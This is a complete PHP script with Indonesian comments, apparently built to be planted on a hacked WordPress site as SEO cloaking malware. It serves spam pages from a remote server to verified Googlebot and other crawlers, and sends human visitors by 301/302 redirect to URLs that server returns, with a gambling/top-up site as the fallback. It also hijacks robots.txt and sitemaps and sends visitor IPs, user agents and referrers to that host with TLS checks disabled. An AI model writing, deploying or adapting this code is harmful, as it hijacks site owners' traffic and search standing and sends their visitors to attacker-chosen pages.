<?php
// index-client.php (DIUPLOAD sebagai index.txt)
// Versi Final V6: Menggabungkan semua logika ke dalam satu file.

error_reporting(0);
@set_time_limit(120);
@ignore_user_abort(1);

// ** URL Server Endpoint (index-endpoint.php) **
$tr = "https://dirtysecretsporn.com/";

// Kunci rahasia untuk pratinjau. HARUS SAMA dengan yang ada di dashboard.php
define('SEO_PREVIEW_KEY', 'secretpreview12345');

// --- KELAS VERIFIKASI BOT (DIGABUNGKAN) ---
class BotVerifier {
    private static $cache = [];

    public static function isVerifiedGooglebot() {
        $ip = $_SERVER['REMOTE_ADDR'];
        if (isset(self::$cache[$ip])) { return self::$cache[$ip]; }

        $hostname = @gethostbyaddr($ip);

        if ($hostname === $ip || (strpos($hostname, '.googlebot.com') === false && strpos($hostname, '.google.com') === false)) {
            self::$cache[$ip] = false;
            return false;
        }

        $resolved_ip = @gethostbyname($hostname);

        if ($resolved_ip === $ip) {
            self::$cache[$ip] = true;
            return true;
        }

        self::$cache[$ip] = false;
        return false;
    }
}


// --- KELAS UTAMA UNTUK REQUEST ---
class Req
{
    public function server($name = '', $default = '') { if (empty($name)) { return $_SERVER; } $name = strtoupper($name); return isset($_SERVER[$name]) ? $_SERVER[$name] : $default; }
    public function scheme() { if ($this->server('HTTPS') && ("1" == $this->server('HTTPS') || "on" == strtolower($this->server('HTTPS')))) { return "https"; } elseif ('https' == $this->server('REQUEST_SCHEME')) { return "https"; } elseif ('443' == $this->server('SERVER_PORT')) { return "https"; } elseif ('https' == $this->server('HTTP_X_FORWARDED_PROTO')) { return "https"; } return "http"; }
    public function dm() { $host = strval($this->server('HTTP_X_FORWARDED_HOST') ?: $this->server('HTTP_HOST')); $host = strpos($host, ':') ? strstr($host, ':', true) : $host; return $this->scheme() . "://" . $host; }
    public function ip() { if (getenv('HTTP_CLIENT_IP')) { $ip = getenv('HTTP_CLIENT_IP'); } elseif (getenv('HTTP_X_FORWARDED_FOR')) { $ip = getenv('HTTP_X_FORWARDED_FOR'); } elseif (getenv('REMOTE_ADDR')) { $ip = getenv('REMOTE_ADDR'); } else { $ip = $this->server('REMOTE_ADDR'); } return $ip; }
    public function uri() { $requri = $this->server('REQUEST_URI'); if ($pos = strpos($requri, '?')) { $requri = substr($requri, 0, $pos); } $uri_clean = trim(preg_replace('/\/+/', '/', $requri), '/'); return ($uri_clean === '' || $uri_clean === 'index.php') ? '/' : '/' . $uri_clean; }
    public function execReq($url, $p = array()) { $url = str_replace(' ', '+', $url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 20); $p['user_agent'] = $this->server('HTTP_USER_AGENT'); $p['referrer'] = $this->server('HTTP_REFERER'); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($p)); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); $output = curl_exec($ch); $errorCode = curl_errno($ch); curl_close($ch); return (0 !== $errorCode) ? "" : $output; }
}

$req = new Req();
$uri = urldecode($req->uri());
$uri_no_slash = ltrim($uri, '/');
$sitemap_slugs_cache = null;

function is_seo_url_in_sitemap(string $uri_to_check, Req $req, string $tr): bool
{
    global $sitemap_slugs_cache;
    $uri_to_check = ltrim($uri_to_check, '/');
    if (is_array($sitemap_slugs_cache)) { return in_array($uri_to_check, $sitemap_slugs_cache); }
    $list_url = $tr . "list";
    $json_output = $req->execReq($list_url);
    $sitemap_data = json_decode($json_output, true);
    if (is_array($sitemap_data)) { $sitemap_slugs_cache = $sitemap_data; return in_array($uri_to_check, $sitemap_slugs_cache); }
    return false;
}

function is_known_bot_by_ua(Req $req): bool
{
    $user_agent = strtolower($req->server('HTTP_USER_AGENT', ''));
    if (empty($user_agent)) return false;
    
    // Daftar ini sekarang hanya untuk bot non-Google, karena Google diverifikasi dengan Hostname.
    $bots = [ 'bingbot', 'slurp', 'duckduckbot', 'msnbot', 'baiduspider', 'yandexbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot' ];
    
    // Pengecekan Googlebot/InspectionTool berdasarkan UA sebagai fallback cepat
    if (strpos($user_agent, 'googlebot') !== false || strpos($user_agent, 'google-inspectiontool') !== false) return true;

    foreach ($bots as $bot) { if (strpos($user_agent, $bot) !== false) return true; }
    return false;
}

// --- LOGIKA UTAMA ---

$is_preview_mode = (isset($_GET['_preview']) && $_GET['_preview'] === SEO_PREVIEW_KEY);
$is_wp_file = preg_match('/^\/(wp-admin|wp-content|wp-includes|wp-json|feed|.*\.php|.*\.css|.*\.js|.*\.jpg|.*\.png|.*\.gif|.*\.svg)/i', $uri);
if ($uri === '/' || $is_wp_file) { return; }

if (substr($uri, -10) == "robots.txt" || substr($uri, -4) == ".xml") {
    $p = ["domain" => $req->dm(), "uri" => $uri_no_slash];
    if (substr($uri, -10) == "robots.txt") { header("Content-type:text/plain; charset=utf-8"); die($req->execReq($tr . "robots", $p)); }
    if (substr($uri, -4) == ".xml") { $sitemap_name = basename($uri); $action_url = $tr . ($sitemap_name !== 'sitemap.xml' && $sitemap_name !== 'allsitemap.xml' ? 'map' : 'sitemap'); $output = $req->execReq($action_url, $p); header("Content-type:text/" . (substr($output, 0, 5) === '<?xml' ? 'xml' : 'plain') . '; charset=utf-8'); die($output); }
}

if (is_seo_url_in_sitemap($uri, $req, $tr)) {
    // Verifikasi dua lapis: Cek Hostname Google ATAU cek User Agent bot lain.
    $is_bot = BotVerifier::isVerifiedGooglebot() || is_known_bot_by_ua($req);

    if ($is_bot || $is_preview_mode) {
        // Tampilkan halaman SEO jika itu bot terverifikasi ATAU mode pratinjau
        $p = ["domain" => $req->dm(), "uri" => $uri_no_slash, "ip" => $req->ip()];
        die($req->execReq($tr . "indata", $p));
    } else {
        // Alihkan semua yang lain
        $p = ["domain" => $req->dm(), "uri" => $uri_no_slash, "ip" => $req->ip()];
        $destination_url = trim($req->execReq($tr . "jump", $p));
        if (strpos($destination_url, 'http') === 0) {
            header("Location: " . $destination_url, true, 301);
        } else {
            header("Location: https://topupgameku.id/", true, 302);
        }
        exit;
    }
}

return;
?>
